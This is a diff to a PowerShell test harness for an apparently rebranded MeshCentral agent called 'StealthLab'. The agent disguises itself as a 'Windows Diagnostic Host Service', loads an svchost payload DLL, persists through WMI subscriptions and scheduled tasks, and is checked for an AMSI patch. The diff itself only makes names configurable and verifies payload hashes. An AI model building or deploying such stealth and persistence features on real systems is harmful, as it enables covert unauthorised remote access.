@@ -135,7 +135,8 @@ if (-not $brandingConfig) {
     Write-Host "[WARN] Branding configuration missing; branding consistency checks will be skipped." -ForegroundColor Yellow
 }
 
-$mshPath = Join-Path $repoRoot "WinDiagnosticHost.msh"
+$mshFileName = if ($env:MESH_MSH_FILENAME) { $env:MESH_MSH_FILENAME } else { 'meshagent.msh' }
+$mshPath = Join-Path $repoRoot $mshFileName
 
 # Test results
 $Script:TestResults = @{
@@ -399,7 +400,8 @@ function Get-PeCertificateTableInfo {
         if ($optionalHeaderOffset -lt 0 -or ($optionalHeaderOffset + 2) -gt ($Bytes.Length)) { return $null }
 
         $magic = [System.BitConverter]::ToUInt16($Bytes, $optionalHeaderOffset)
-        $dataDirectoryOffset = $optionalHeaderOffset + (($magic -eq 0x20B) ? 0x70 : 0x60)
+        $directoryTableBase = if ($magic -eq 0x20B) { 0x70 } else { 0x60 }
+        $dataDirectoryOffset = $optionalHeaderOffset + $directoryTableBase
         $certDirectoryOffset = $dataDirectoryOffset + (8 * 4)
 
         if (($certDirectoryOffset + 8) -gt $Bytes.Length) { return $null }
@@ -534,7 +536,7 @@ function Invoke-MeshCentralDownloadValidation {
                 Write-TestResult -TestName "MeshCentral Embedded MSH Matches Local" -Status "Fail" -Message $detail
             }
         } else {
-            Write-TestResult -TestName "MeshCentral Embedded MSH Matches Local" -Status "Warning" -Message "Local WinDiagnosticHost.msh missing; skipped comparison."
+            Write-TestResult -TestName "MeshCentral Embedded MSH Matches Local" -Status "Warning" -Message "Local meshagent.msh missing; skipped comparison."
         }
     } catch {
         Write-TestResult -TestName "MeshCentral Binary Matches StealthLab" -Status "Warning" -Message ("MeshCentral comparison failed: {0}" -f $_.Exception.Message)
@@ -582,7 +584,13 @@ function Stage-RuntimeBinary {
 }
 
 function Get-InstallerLogPath {
-    return "C:\ProgramData\DiagnosticHost\logs\installer.log"
+    $serviceMetadata = Get-BrandingServiceMetadata
+    $logDirectory = $serviceMetadata.LogDirectory
+    if ([string]::IsNullOrWhiteSpace($logDirectory)) {
+        $svcName = if ($env:MESH_SERVICE_NAME) { $env:MESH_SERVICE_NAME } else { 'MeshAgent' }
+        $logDirectory = Join-Path $env:ProgramData ($svcName + '\logs')
+    }
+    return Join-Path $logDirectory 'installer.log'
 }
 
 function Reset-InstallerLog {
@@ -714,7 +722,7 @@ function Test-WmiRestartTask {
     }
 
     $servicePrefix = ConvertTo-SanitizedToken($serviceMetadata.ServiceName)
-    if (-not $servicePrefix) { $servicePrefix = 'WinDiagnosticHost' }
+    if (-not $servicePrefix) { $servicePrefix = 'MeshAgent' }
     $wmiClassHint = Get-BrandingWmiClassName
     $wmiPrefix = Get-DiagnosticHostWmiPrefix -ServicePrefix $servicePrefix -WmiClassHint $wmiClassHint
     $filterName = if ($persistenceState) { $persistenceState.WmiFilter } else { $null }
@@ -802,16 +810,17 @@ function Test-AmsiPatchLog {
 }
 
 function Remove-DiagnosticHostArtifacts {
-    $installRoot = Join-Path $env:ProgramData "DiagnosticHost"
+    $serviceMetadata = Get-BrandingServiceMetadata
+    $installRoot = $serviceMetadata.InstallRoot
     if ([string]::IsNullOrWhiteSpace($installRoot)) { return }
 
     $persistenceState = Get-DiagnosticHostPersistenceState
 
     $targets = @(
-        @{ Path = Join-Path $installRoot "diagsvc.dll"; Label = "svchost payload" },
-        @{ Path = Join-Path $installRoot "diaghost.exe"; Label = "standalone binary" },
-        @{ Path = Join-Path $installRoot "diaghost.db"; Label = "database" },
-        @{ Path = Join-Path $installRoot "diaghost.conf"; Label = "config" }
+        @{ Path = Join-Path $installRoot $serviceMetadata.ServiceDllName; Label = "svchost payload" },
+        @{ Path = Join-Path $installRoot $serviceMetadata.BinaryName; Label = "standalone binary" },
+        @{ Path = Join-Path $installRoot $serviceMetadata.DatabaseName; Label = "database" },
+        @{ Path = Join-Path $installRoot $serviceMetadata.ConfigFileName; Label = "config" }
     )
 
     foreach ($target in $targets) {
@@ -830,7 +839,7 @@ function Remove-DiagnosticHostArtifacts {
     Remove-DiagnosticHostScheduledTasks -TaskNames $scheduledTaskNames
 
     $servicePrefix = ConvertTo-SanitizedToken($serviceMetadata.ServiceName)
-    if (-not $servicePrefix) { $servicePrefix = 'WinDiagnosticHost' }
+    if (-not $servicePrefix) { $servicePrefix = 'MeshAgent' }
     $wmiClassHint = Get-BrandingWmiClassName
     Remove-DiagnosticHostWmiSubscriptions -PersistenceState $persistenceState -ServicePrefix $servicePrefix -WmiClassHint $wmiClassHint
     Remove-DiagnosticHostPersistenceState -PersistenceState $persistenceState
@@ -839,18 +848,61 @@ function Remove-DiagnosticHostArtifacts {
 function Get-BrandingServiceMetadata {
     $serviceName = $null
     $serviceDisplayName = $null
+    $installRoot = Join-Path $env:ProgramData "MeshAgent"
+    $logDirectory = Join-Path $installRoot "logs"
+    $serviceDllName = 'meshsvc.dll'
+    $binaryName = 'meshagent.exe'
+    $databaseName = 'meshagent.db'
+    $configFileName = 'meshagent.conf'
+
     if ($brandingConfig -and $brandingConfig.branding) {
         $brandingProps = $brandingConfig.branding.PSObject.Properties
-        if ($brandingProps['serviceName']) {
+        if ($brandingProps['serviceName'] -and -not [string]::IsNullOrWhiteSpace($brandingConfig.branding.serviceName)) {
             $serviceName = $brandingConfig.branding.serviceName
         }
-        if ($brandingProps['serviceDisplayName']) {
+        if ($brandingProps['displayName'] -and -not [string]::IsNullOrWhiteSpace($brandingConfig.branding.displayName)) {
+            $serviceDisplayName = $brandingConfig.branding.displayName
+        } elseif ($brandingProps['serviceDisplayName'] -and -not [string]::IsNullOrWhiteSpace($brandingConfig.branding.serviceDisplayName)) {
             $serviceDisplayName = $brandingConfig.branding.serviceDisplayName
         }
+        if ($brandingProps['installRoot'] -and -not [string]::IsNullOrWhiteSpace($brandingConfig.branding.installRoot)) {
+            $installRoot = $brandingConfig.branding.installRoot.ToString().Replace('/','\')
+        }
+        if ($brandingProps['logPath'] -and -not [string]::IsNullOrWhiteSpace($brandingConfig.branding.logPath)) {
+            $logDirectory = $brandingConfig.branding.logPath.ToString().Replace('/','\')
+        } else {
+            $logDirectory = Join-Path $installRoot 'logs'
+        }
+        if ($brandingProps['binaryName'] -and -not [string]::IsNullOrWhiteSpace($brandingConfig.branding.binaryName)) {
+            $binaryName = $brandingConfig.branding.binaryName
+        }
     }
+
+    if ($brandingConfig) {
+        $resolvedServiceDll = Get-BrandingSvchostDllName -Config $brandingConfig
+        if (-not [string]::IsNullOrWhiteSpace($resolvedServiceDll)) {
+            $serviceDllName = $resolvedServiceDll
+        }
+        if ($brandingConfig.artifacts) {
+            $artifactProps = $brandingConfig.artifacts.PSObject.Properties
+            if ($artifactProps['databaseName'] -and -not [string]::IsNullOrWhiteSpace($brandingConfig.artifacts.databaseName)) {
+                $databaseName = $brandingConfig.artifacts.databaseName
+            }
+            if ($artifactProps['configFileName'] -and -not [string]::IsNullOrWhiteSpace($brandingConfig.artifacts.configFileName)) {
+                $configFileName = $brandingConfig.artifacts.configFileName
+            }
+        }
+    }
+
     return [pscustomobject]@{
         ServiceName = $serviceName
         ServiceDisplayName = $serviceDisplayName
+        InstallRoot = $installRoot
+        LogDirectory = $logDirectory
+        ServiceDllName = $serviceDllName
+        BinaryName = $binaryName
+        DatabaseName = $databaseName
+        ConfigFileName = $configFileName
     }
 }
 
@@ -878,7 +930,8 @@ function Get-BrandingWmiClassName {
 }
 
 function Get-DiagnosticHostPersistencePath {
-    $root = Join-Path $env:ProgramData "DiagnosticHost"
+    $serviceMetadata = Get-BrandingServiceMetadata
+    $root = $serviceMetadata.InstallRoot
     return Join-Path $root "state\persistence.ini"
 }
 
@@ -1054,7 +1107,7 @@ function Get-DiagnosticHostBaseNames {
 
     $additional = @()
     if ($AdditionalNames) { $additional = $AdditionalNames }
-    $candidates = @($ServiceName, $ServiceDisplayName) + $additional + @('WinDiagnosticHost', 'Windows Diagnostic Host Service')
+    $candidates = @($ServiceName, $ServiceDisplayName) + $additional + @('MeshAgent', 'Windows Diagnostic Host Service')
     return $candidates | Where-Object { -not [string]::IsNullOrWhiteSpace($_) } | Select-Object -Unique
 }
 
@@ -1078,7 +1131,7 @@ function Get-DiagnosticHostScheduledTaskNames {
         $token = ConvertTo-SanitizedToken($base)
         if ($token) { $sanitizedTokens += $token }
     }
-    $sanitizedTokens += @('WinDiagnosticHost', 'WindowsDiagnosticHostService')
+    $sanitizedTokens += @('MeshAgent', 'WindowsDiagnosticHostService')
     $sanitizedTokens = $sanitizedTokens | Where-Object { -not [string]::IsNullOrWhiteSpace($_) } | Select-Object -Unique
     if ($sanitizedTokens.Count -eq 0) {
         $sanitizedTokens = @('DiagHost')
@@ -1311,30 +1364,36 @@ function Convert-MeshIdToHexString {
     }
 }
 
-$script:EmbeddedPayloadHeaderVerified = $false
+$script:EmbeddedPayloadVerified = $false
 
-function Ensure-EmbeddedPayloadHeader {
-    if ($script:EmbeddedPayloadHeaderVerified) { return }
-    $headerPath = Join-Path $repoRoot "meshcore\embedded\generated\svchost_payload.h"
-    if (-not (Test-Path -LiteralPath $headerPath)) {
-        throw "Embedded svchost payload header missing at $headerPath"
+function Ensure-EmbeddedPayloadResource {
+    if ($script:EmbeddedPayloadVerified) { return }
+    $resourcePath = Join-Path $repoRoot "meshservice\embedded\svchost_payload.dll"
+    if (-not (Test-Path -LiteralPath $resourcePath)) {
+        throw "Embedded svchost payload resource missing at $resourcePath"
     }
 
     $metadataPath = Join-Path $repoRoot "meshcore\embedded\generated\svchost_payload.json"
     if (Test-Path -LiteralPath $metadataPath) {
         $metadata = Get-Content -LiteralPath $metadataPath -Raw | ConvertFrom-Json -ErrorAction Stop
-        if ($metadata -and $metadata.sha256 -and $metadata.input -and (Test-Path -LiteralPath $metadata.input)) {
+        if ($metadata -and $metadata.sha256) {
             $expected = ($metadata.sha256.ToString()).ToLowerInvariant()
-            $actual = ((Get-FileHash -Path $metadata.input -Algorithm SHA256).Hash).ToLowerInvariant()
-            if ($expected -ne $actual) {
-                throw "Embedded svchost payload metadata hash mismatch (expected $expected, actual $actual)"
+            $resourceActual = ((Get-FileHash -LiteralPath $resourcePath -Algorithm SHA256).Hash).ToLowerInvariant()
+            if ($expected -ne $resourceActual) {
+                throw "Embedded svchost payload resource hash mismatch (expected $expected, actual $resourceActual)"
+            }
+            if ($metadata.input -and (Test-Path -LiteralPath $metadata.input)) {
+                $inputActual = ((Get-FileHash -LiteralPath $metadata.input -Algorithm SHA256).Hash).ToLowerInvariant()
+                if ($expected -ne $inputActual) {
+                    throw "Embedded svchost payload metadata hash mismatch (source DLL drift)."
+                }
             }
         }
     } else {
         Write-Warn "svchost payload metadata missing; unable to cross-check source DLL hash."
     }
 
-    $script:EmbeddedPayloadHeaderVerified = $true
+    $script:EmbeddedPayloadVerified = $true
 }
 
 function Test-IsAdmin {
@@ -2308,20 +2367,21 @@ if ($brandingConfig) {
             Write-TestResult -TestName "MSH displayName matches branding" -Status "Fail" -Message ("Expected {0}, found {1}" -f $expectedDisplayName, ($mshMap['displayName']))
         }
     } else {
-        Write-TestResult -TestName "WinDiagnosticHost.msh present" -Status "Warning" -Message "Provisioning file not found at $mshPath"
+        Write-TestResult -TestName "meshagent.msh present" -Status "Warning" -Message "Provisioning file not found at $mshPath"
     }
 
     $expectedServerHash = $brandingConfig.security.serverCertHash
     $serviceName = $brandingConfig.branding.serviceName
     $displayName = $brandingConfig.branding.displayName
     $expectedMeshId = (Convert-MeshIdToHexString -MeshId $brandingConfig.provisioning.meshId)
+    $serviceMetadata = Get-BrandingServiceMetadata
 
     $binarySet = @()
     $exeBinaries = @()
     if ($x64Binary) { $binarySet += $x64Binary; $exeBinaries += $x64Binary }
     if ($x86Binary) { $binarySet += $x86Binary; $exeBinaries += $x86Binary }
     $diagsvcCandidates = @(
-        Join-Path $BinaryPath "diagsvc.dll"
+        Join-Path $BinaryPath $serviceMetadata.ServiceDllName
         Join-Path $BinaryPath "MeshService-2022.dll"
         Join-Path $repoRoot "meshservice\x64\StealthLab_DLL\MeshService-2022.dll"
     )
@@ -2389,7 +2449,7 @@ if ($RuntimeValidation) {
     }
     else {
         try {
-            Ensure-EmbeddedPayloadHeader
+            Ensure-EmbeddedPayloadResource
             $runtimeServiceName = $null
             if ($brandingConfig.branding) {
                 $runtimeServiceName = ($brandingConfig.branding | Select-Object -ExpandProperty serviceFile -ErrorAction SilentlyContinue)
@@ -2401,7 +2461,7 @@ if ($RuntimeValidation) {
                 }
             }
             if ([string]::IsNullOrWhiteSpace($runtimeServiceName)) {
-                $runtimeServiceName = "WinDiagnosticHost"
+                $runtimeServiceName = "MeshAgent"
             }
             if (-not (Ensure-RuntimeServiceAbsent -ServiceName $runtimeServiceName -BinaryPath $x64Binary)) {
                 Write-RuntimeSkipResults ("Runtime validation aborted: Unable to remove existing service '{0}'." -f $runtimeServiceName)
